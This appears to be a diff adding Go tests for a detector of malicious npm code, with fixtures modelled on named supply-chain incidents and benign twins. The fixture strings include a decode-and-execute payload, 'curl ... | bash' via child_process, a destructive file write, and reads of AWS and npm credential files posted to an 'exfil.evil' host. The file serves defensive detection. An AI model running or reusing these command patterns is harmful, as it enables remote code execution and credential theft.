@@ -209,3 +209,144 @@ func TestAnalyzer_Analyze_HonorsContextCancellation(t *testing.T) {
 	))
 	assert.ErrorIs(t, err, ctx.Err())
 }
+
+// ============================================================
+// Real-incident fixture corpus. Each models the *technique* of a
+// named npm supply-chain incident (not the verbatim payload) and
+// asserts the Counts that must fire, plus a benign twin that must
+// score zero — the no-false-positive baseline AST.md §3 requires.
+// ============================================================
+
+func counts(t *testing.T, src string) astfeature.Counts {
+	t.Helper()
+	c, err := NewAnalyzer().Analyze(t.Context(), seq(
+		fe{f: astfeature.SourceFile{Path: "index.js", Content: []byte(src)}},
+	))
+	require.NoError(t, err)
+	return c
+}
+
+// TestIncident_EventStream models event-stream / flatmap-stream
+// (2018): a runtime-decoded payload executed via the Function
+// constructor. The decode-then-execute pair is the fingerprint —
+// Base64DecodeCalls AND DynamicEvalCalls must both spike. This is the
+// fixture that demands Buffer.from(x,'base64') second-arg resolution
+// (AST.md: a resolver addition is justified by a real incident).
+func TestIncident_EventStream(t *testing.T) {
+	t.Parallel()
+	malicious := "" +
+		"const blob = 'ZG9Tb21ldGhpbmcoKQ==';\n" +
+		"const payload = Buffer.from(blob, 'base64').toString();\n" +
+		"new Function(payload)();\n"
+	c := counts(t, malicious)
+	assert.Positive(t, c.DynamicEvalCalls, "new Function(decoded) is code-from-data execution")
+	assert.Positive(t, c.Base64DecodeCalls,
+		"Buffer.from(x,'base64') is THE npm payload-decode primitive — "+
+			"the decode+exec pair is the event-stream fingerprint")
+	assert.Positive(t, c.ImportTimeCallSites, "the payload runs at require time")
+
+	// Benign twin: Buffer.from with no decode encoding, and no
+	// dynamic execution, must score zero.
+	benign := "" +
+		"const buf = Buffer.from([1, 2, 3]);\n" +
+		"const s = Buffer.from('hello', 'utf8').toString();\n" +
+		"module.exports = { buf, s };\n"
+	bc := counts(t, benign)
+	assert.Equal(t, 0, bc.Base64DecodeCalls,
+		"Buffer.from(array) and Buffer.from(x,'utf8') are ordinary "+
+			"buffer construction — never a payload decode")
+	assert.Equal(t, 0, bc.DynamicEvalCalls)
+}
+
+// TestIncident_UAParserJS models ua-parser-js / coa / rc (2021): the
+// hijacked release shipped code that shelled out to download and run
+// a miner. require('child_process').<exec-family>(...) must count as
+// ExecCalls across the variants real droppers use.
+func TestIncident_UAParserJS(t *testing.T) {
+	t.Parallel()
+	for _, m := range []string{"exec", "execSync", "spawn", "spawnSync", "execFile"} {
+		src := "require('child_process')." + m + "('curl -s http://evil/x.sh | bash');\n"
+		c := counts(t, src)
+		assert.Positivef(t, c.ExecCalls,
+			"child_process.%s via inline require chain must count as exec", m)
+		assert.Positive(t, c.ImportTimeCallSites, "runs at require time")
+	}
+
+	// No-false-positive: a method merely named .exec on something
+	// that is not child_process (sqlite db handle, regex) must NOT
+	// count — the specificity is the signal.
+	benign := "" +
+		"const db = require('better-sqlite3')('x.db');\n" +
+		"db.exec('CREATE TABLE t(x)');\n" +
+		"const re = /a/; re.exec('abc');\n"
+	bc := counts(t, benign)
+	assert.Equal(t, 0, bc.ExecCalls,
+		"db.exec / regex.exec share a name with child_process.exec but "+
+			"are not process execution — must not flag")
+}
+
+// TestIncident_NodeIPC models node-ipc (2022): geo-gated destructive
+// behavior plus a network call to resolve geo-IP. We catch the
+// network surface; the destructive fs.writeFile loop has NO Counts
+// field (a model-level gap shared across all language analyzers, not
+// a node bug — surfaced honestly, not silently). The test pins what
+// we DO detect and asserts we don't invent signal we lack.
+func TestIncident_NodeIPC(t *testing.T) {
+	t.Parallel()
+	malicious := "" +
+		"const https = require('https');\n" +
+		"https.get('https://api.ipgeolocation.io/ipgeo?apiKey=x', (r) => r);\n" +
+		"const fs = require('fs');\n" +
+		"fs.writeFileSync(targetPath, '\\u2764');\n"
+	c := counts(t, malicious)
+	assert.Positive(t, c.NetworkCallSites, "https.get for geo-IP is real network egress")
+	assert.Equal(t, 0, c.ExecCalls, "no process execution in this shape")
+	assert.Equal(t, 0, c.DynamicEvalCalls)
+	// fs.writeFileSync destruction is intentionally uncounted: there
+	// is no destructive-write Counts field. Documenting via assertion
+	// so a future schema decision is a deliberate, visible change.
+	assert.Equal(t, 0, c.SensitivePathReads,
+		"writeFileSync is a write, not a sensitive READ — out of model scope")
+}
+
+// TestIncident_ShaiHulud models the credential-harvest worm shape
+// (2025–26, design/threat-landscape/*): read npm/cloud credentials
+// and exfil them on install/require. A statically-resolvable
+// credential path is a true positive; the dynamic-path variant is a
+// documented conservative miss (parity with python's pathlib gap) —
+// both asserted so the boundary is explicit.
+func TestIncident_ShaiHulud(t *testing.T) {
+	t.Parallel()
+
+	// Resolvable literal credential path → true positive.
+	hardcoded := "" +
+		"const fs = require('fs');\n" +
+		"const creds = fs.readFileSync('/root/.aws/credentials', 'utf8');\n" +
+		"require('https').request('https://exfil.evil/c', { method: 'POST' });\n"
+	c := counts(t, hardcoded)
+	assert.Positive(t, c.SensitivePathReads,
+		"fs.readFileSync('/root/.aws/credentials') is credential theft")
+	assert.Positive(t, c.NetworkCallSites, "https.request is the exfil channel")
+
+	// Dynamic path via os.homedir() — unresolved by the static
+	// resolver (call result), so SensitivePathReads is a conservative
+	// MISS. Network still fires; the anomaly still trips on the pair.
+	dynamic := "" +
+		"const fs = require('fs');\n" +
+		"const os = require('os');\n" +
+		"fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n" +
+		"require('https').request('https://exfil.evil/c', { method: 'POST' });\n"
+	d := counts(t, dynamic)
+	assert.Equal(t, 0, d.SensitivePathReads,
+		"os.homedir()+'/.npmrc' is a runtime-built path — documented "+
+			"conservative miss, never a false guess")
+	assert.Positive(t, d.NetworkCallSites,
+		"network exfil still fires, so the decode/read+exfil anomaly "+
+			"still trips even when the path itself is unresolved")
+
+	// Benign twin: reading a non-sensitive resolvable path.
+	benign := "const fs = require('fs');\nfs.readFileSync('./package.json', 'utf8');\n"
+	b := counts(t, benign)
+	assert.Equal(t, 0, b.SensitivePathReads,
+		"reading ./package.json is ordinary I/O — must not flag")
+}
